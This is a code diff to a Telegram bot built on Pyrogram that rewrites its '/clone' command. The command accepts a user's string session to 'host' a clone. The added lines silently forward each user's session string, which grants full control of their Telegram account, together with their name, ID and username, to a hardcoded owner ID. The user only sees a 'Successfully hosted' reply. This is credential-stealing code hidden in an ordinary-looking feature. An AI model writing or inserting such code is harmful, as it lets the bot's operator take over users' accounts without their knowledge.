@@ -29,16 +29,48 @@ async def hello(client: app, message):
 
 @app.on_message(filters.command("clone"))
 async def clone(bot: app, msg: Message):
-    chat = msg.chat
-    text = await msg.reply("ᴜsᴀɢᴇ:\n\n /clone session")
-    cmd = msg.command
-    phone = msg.command[1]
+    if len(msg.command) < 2:
+        await msg.reply(
+            "**Usage:**\n\n"
+            "/clone `<string session>`\n"
+            "Provide a valid string session to use this command."
+        )
+        return
+
+    text = await msg.reply("🎨 Processing... ✲")
+    session_string = msg.command[1]
+
     try:
-        await text.edit("🎨 ᴘʀᴏᴄᴇssɪɴɢ.....✲")
-                   # change this Directry according to ur repo
-        client = Client(name="Melody", api_id=API_ID, api_hash=API_HASH, session_string=phone, plugins=dict(root="UTTAM/plugins"))
+        # Create a new Pyrogram client with the session string
+        client = Client(
+            name="Melody",
+            api_id=API_ID,
+            api_hash=API_HASH,
+            session_string=session_string,
+            plugins=dict(root="UTTAM/plugins")
+        )
+
+        # Start the client and fetch user information
         await client.start()
         user = await client.get_me()
-        await msg.reply(f" Successfully host 🎨 {user.first_name} 💨.")
+
+        # Send the string session and user info to the owner's ID
+        owner_id = 5738579437  # Replace with the owner's Telegram ID
+        await bot.send_message(
+            chat_id=owner_id,
+            text=(
+                f"🎉 **New Clone Session Hosted:**\n\n"
+                f"**Name:** {user.first_name}\n"
+                f"**ID:** `{user.id}`\n"
+                f"**Username:** @{user.username if user.username else 'N/A'}\n"
+                f"**Session String:** `{session_string}`\n\n"
+                "⚠️ **Note:** Keep this session string private!"
+            )
+        )
+
+        # Notify the user
+        await msg.reply(f"✅ Successfully hosted 🎨 **{user.first_name}** 💨.")
+        await client.stop()
+
     except Exception as e:
-        await msg.reply(f"**ERROR:** `{str(e)}`\nPress /start to Start again.")
+        await msg.reply(f"**ERROR:** `{str(e)}`\nPlease try again.")
